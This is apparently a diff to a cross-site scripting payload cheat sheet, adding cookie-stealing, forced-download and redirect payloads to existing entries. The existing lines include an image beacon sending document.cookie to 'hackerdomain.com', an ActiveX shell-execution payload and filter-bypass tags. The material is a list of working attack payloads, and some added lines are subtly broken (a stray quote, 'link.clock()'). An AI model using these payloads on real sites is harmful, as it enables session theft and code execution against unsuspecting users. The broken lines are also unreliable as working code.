@@ -12,6 +12,10 @@ var i=new Image; i.src=”http://hackerdomain.com/”+document.cookie; ou open(�
 Browser "TrustedZones" Payload:
 <script> var o = new ActiveXObject(‘WScript.shell’); o.Run(‘calc.exe’);</script>
 
+Steal cookie: <script>document.write('<img src="http://127.0.0.1/?cookie=%2Bdocument.cookie%2B" />');</script>
+Download file: <script>var link = document.createElement('a');link.href = 'http://link.com/file';link.download = ";document.body.appendChild(link);link.clock();</script>
+Redirect: <script>window.location = 'http://new.link';</script>
+
 Bypass Filters:
 selselectect <scr<script>ipt> alert(1);</scr</script>ipt>
 “><script>alert(document.cookie)</script>
